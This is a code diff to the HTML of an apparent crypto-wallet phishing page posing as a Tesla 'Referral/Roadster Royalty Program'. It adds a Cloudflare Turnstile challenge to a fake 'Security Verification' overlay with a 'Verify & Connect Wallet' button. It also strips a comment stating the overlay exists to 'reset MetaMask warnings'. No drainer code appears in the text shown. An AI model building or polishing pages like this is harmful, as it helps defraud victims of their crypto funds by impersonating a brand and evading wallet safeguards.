@@ -6,13 +6,17 @@
     <title>Tesla Referral/Roadster Royalty Program</title>
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <!-- Cloudflare Turnstile Script -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
 <body>
-    <!-- SECURITY OVERLAY: Forces interaction to reset MetaMask warnings -->
+    <!-- SECURITY OVERLAY -->
     <div id="security-overlay" class="overlay">
         <div class="overlay-content">
             <h2>🔒 Security Verification</h2>
             <p>Please confirm you are human to proceed with the Tesla Loyalty Program.</p>
+            <!-- Cloudflare Turnstile Widget -->
+            <div class="cf-turnstile" data-sitekey="0x4AAAAAAGARoauzYtNMWqAl"></div>
             <button id="verify-btn">Verify & Connect Wallet</button>
         </div>
     </div>
